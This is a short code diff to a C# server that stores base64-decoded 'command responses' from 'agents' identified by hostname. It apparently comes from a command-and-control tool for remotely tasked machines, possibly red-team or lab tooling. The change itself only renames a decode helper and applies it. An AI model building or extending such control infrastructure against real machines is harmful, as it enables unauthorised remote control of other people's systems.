@@ -171,7 +171,7 @@ namespace server{
                 return "{\"response\": \"Client not found!\"}";
             } else if (root.TryGetProperty("response", out JsonElement response)) {
                 //get and parse a client response
-                this.agents[hostname.GetString()].commandResp.Add(response.ToString());
+                this.agents[hostname.GetString()].commandResp.Add(Base64DecodeString(response.ToString()));
                 return Base64EncodeString("{\"response\": \"thanks\"}");
             } else {
                 return HttpStatusCode.NotFound.ToString();
@@ -221,7 +221,7 @@ namespace server{
             //takes a string and returns it in base64
             return Convert.ToBase64String(Encoding.ASCII.GetBytes(str));
         }
-        private string Base64Decode(string str){
+        private string Base64DecodeString(string str){
             //takes a base64 string and returns the decoded string
             var b_base64 = Convert.FromBase64String(str);
             return Encoding.UTF8.GetString(b_base64);
